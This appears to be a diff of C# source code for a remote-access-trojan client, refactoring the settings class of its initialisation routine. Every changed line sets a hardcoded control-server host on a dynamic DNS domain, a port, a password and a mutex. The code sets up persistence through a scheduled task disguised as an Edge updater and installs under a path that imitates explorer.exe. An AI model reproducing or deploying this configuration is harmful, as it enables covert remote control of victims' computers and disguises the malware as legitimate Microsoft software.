@@ -4,7 +4,7 @@ namespace bc.srv.Class
 {
     internal class CreateStClient
     {
-        public bool InitializeStClient()
+        public static bool InitializeStClient()
         {
             
 //             #if DEBUG
@@ -31,11 +31,11 @@ namespace bc.srv.Class
 
             // NORMAL
 
-            ST_Client.Instance.Port = 2401;
-            ST_Client.Instance.Password = "slevin";
-            ST_Client.Instance.Host = "lqphnd2gfz.duckdns.org";
-            ST_Client.Instance.ServerName = "imback";
-            ST_Client.Instance.sMutex = "tUOns2DB6";
+            SrvData.Instance.Port = 2401;
+            SrvData.Instance.Password = "slevin";
+            SrvData.Instance.Host = "lqphnd2gfz.duckdns.org";
+            SrvData.Instance.ServerName = "imback";
+            SrvData.Instance.sMutex = "tUOns2DB6";
 
             // RECUPERO INFO INSTALLAZIONE
             // bool usehk, useex, usestart;
@@ -45,21 +45,21 @@ namespace bc.srv.Class
             // ru.GetInstallInfo(out usehk, out useex, out apppath, out usestart, out startupfilename, out hkcuEntry, out exploEntry);
 
 
-            ST_Client.Instance.UseTaskScheduler = true;
-            ST_Client.Instance.bUseHKCU = false;
-            ST_Client.Instance.bUseExplorer = false;
-            ST_Client.Instance.bUseStartupFolder = false;
+            SrvData.Instance.UseTaskScheduler = true;
+            SrvData.Instance.bUseHKCU = false;
+            SrvData.Instance.bUseExplorer = false;
+            SrvData.Instance.bUseStartupFolder = false;
 
 
-            ST_Client.Instance.sAppDataInstall = "Microsoft\\Windows\\Edge\\explorer.exe";
-            ST_Client.Instance.sStartupFileName = "explore.exe";
-            ST_Client.Instance.TaskSchedulerName = "MicrosoftEdgeUpdaterTaskMachineCore";
+            SrvData.Instance.sAppDataInstall = "Microsoft\\Windows\\Edge\\explorer.exe";
+            SrvData.Instance.sStartupFileName = "explore.exe";
+            SrvData.Instance.TaskSchedulerName = "MicrosoftEdgeUpdaterTaskMachineCore";
             
-            ST_Client.Instance.sHKCUEntry = "winexplorer";
-            ST_Client.Instance.sExplorerEntry = "EXPLORER";
+            SrvData.Instance.sHKCUEntry = "winexplorer";
+            SrvData.Instance.sExplorerEntry = "EXPLORER";
 
             // ERRORE RECUPERO DATI DA RISORSE
-            if (ST_Client.Instance.Port == -1 || ST_Client.Instance.Password == null || ST_Client.Instance.Host == null)
+            if (SrvData.Instance.Port == -1 || SrvData.Instance.Password == null || SrvData.Instance.Host == null)
                 Program.Exit(2);
             //-----------------------------------
 
@@ -81,7 +81,7 @@ namespace bc.srv.Class
             }
             else
             {
-                servName = ST_Client.Instance.ServerName;
+                servName = SrvData.Instance.ServerName;
 
                 if (servName == null)
                     servName = "NO NAME";
@@ -90,11 +90,11 @@ namespace bc.srv.Class
                     true)); // prima esecuzione setto il nome sul registro                
             }
 
-            ST_Client.Instance.ServerName = servName;
+            SrvData.Instance.ServerName = servName;
             //-------------------------------------------------
 
             var uid = new UnivoqueID();
-            ST_Client.Instance.UnivoqueID = uid.GetUnivoqueID(); // ASSEGNO IL CODICE UNIVOCO    
+            SrvData.Instance.UnivoqueID = uid.GetUnivoqueID(); // ASSEGNO IL CODICE UNIVOCO    
 
             return true;
         }
